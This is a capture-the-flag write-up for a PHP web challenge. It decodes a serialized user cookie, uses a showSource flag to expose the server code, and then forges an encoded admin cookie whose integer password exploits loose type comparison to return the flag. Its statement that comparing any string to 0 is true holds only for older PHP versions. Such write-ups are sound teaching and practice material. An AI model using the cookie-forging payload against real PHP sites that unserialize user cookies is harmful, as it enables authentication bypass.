# Usual or Unusual
**Category: Web**
> "A company developed an authentication system and gave it to us for testing, I told the developers the way they authenticate a user is dangerous and unusual,
But they disagreed and told me if i find the secret flag, They would reconsider. Help me find it."


This challenge site was a login page. We get assigned a cookie upon visiting:

`Set-Cookie: cookie=O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22%00User%00id%22%3Bs%3A30%3A%22890143755983288300723865605783%22%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A5%3A%22guest%22%3Bs%3A14%3A%22%00User%00password%22%3Bs%3A5%3A%22guest%22%3Bs%3A16%3A%22%00User%00showSource%22%3Bb%3A0%3Bs%3A11%3A%22%00User%00color%22%3Bs%3A7%3A%22%23FFFFFF%22%3B%7D; expires=Sun, 23-May-2021 00:41:53 GMT; Max-Age=2592000; path=/; HttpOnly; SameSite=Strict`

URL decoded and formatted, we can view the serialized data more clearly:
```php
O:4:"User":5: {
    s:8:".User.id";
    s:30:"890143755983288300723865605783";
    s:14:".User.username";
    s:5:"guest";
    s:14:".User.password";
    s:5:"guest";
    s:16:".User.showSource";
    b:0;
    s:11:".User.color";
    s:7:"#FFFFFF";
}
```

`.User.showSource` is interesting, let's modify our cookie to have `.User.showSource` as `1` and see what happens.

Performing the request again with the modified cookie shows the [source](source.php). The interesting snippet of code is here:

```php
...
if(isset($_COOKIE["cookie"])){
    $user = unserialize($_COOKIE["cookie"]);
    if($user->getShowSource()){
        highlight_file(__FILE__);
        die();
    }else{
        $userColor = $user->getColor();
        gmp_random_seed($seed);
        $rand = gmp_random_bits(100);
        $password = $flag . gmp_strval($rand);
        if($user->getUsername() == "admin"){
            if($user->getPassword() == $password){
                $result = $flag;
            }
        }
    }
}
...
```

The `$result` variable later gets printed to the page. This shows us that in order to get the flag, `$user->getShowSource()` must be false, our username must be `admin`, and our password must be equal to a specific randomized value.

Knowing the value of the `$password` variable we compare against ahead of time is not possible, but we can bypass this with Type Juggling. In PHP, comparing a string to `0` returns `true`. Let's build a custom cookie to abuse this feature (note that the password type gets changed to integer):

```php
O:4:"User":5: {
    s:8:".User.id";
    s:30:"890143755983288300723865605783";
    s:14:".User.username";
    s:5:"admin";
    s:14:".User.password";
    i:0;
    s:16:".User.showSource";
    b:0;
    s:11:".User.color";
    s:7:"#FFFFFF";
}
```
Encoded: `cookie=O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22%00User%00id%22%3Bs%3A30%3A%22890143755983288300723865605783%22%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00User%00password%22%3Bi%3A0%3Bs%3A16%3A%22%00User%00showSource%22%3Bb%3A0%3Bs%3A11%3A%22%00User%00color%22%3Bs%3A7%3A%22%23FFFFFF%22%3B%7D`

Sending a request with this cookie returns the flag: `SBCTF{unserialize_k1nd4_SUS_th0}`